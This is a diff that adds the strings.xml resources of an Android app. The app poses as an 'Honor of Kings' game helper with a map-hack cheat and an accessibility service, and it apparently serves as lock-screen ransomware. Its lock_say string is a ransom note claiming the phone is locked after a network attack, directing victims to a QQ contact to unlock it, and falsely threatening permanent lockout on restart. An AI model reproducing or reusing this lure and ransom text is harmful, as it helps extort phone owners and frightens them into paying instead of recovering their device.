@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">王者荣耀专家</string>
+    <string name="Title">王者荣耀专家</string>
+    <string name="action_settings">帮助</string>
+    <string name="action_floatwindow">打开悬浮窗口</string>
+    <string name="service_name">王者荣耀专家</string>
+    <string name="floating">透视地图</string>
+    <string name="float_btReturn">返回设置</string>
+    <string name="accessibility_description">请启动王者荣耀专家服务！</string>
+    <string name="title_activity_lock">LockActivity</string>
+    <string name="hello_world">Hello world!</string>
+    <string name="lock_say">您的手机遭遇网络攻击！\n已暂时锁定！\n请联系客服：\nQQ：1096754477\n解锁!\n警告：请记牢客服QQ号，千万不能重启手机！否则手机会被永久锁死！</string>
+    <string name="title_activity_camera">CameraActivity</string>
+</resources>
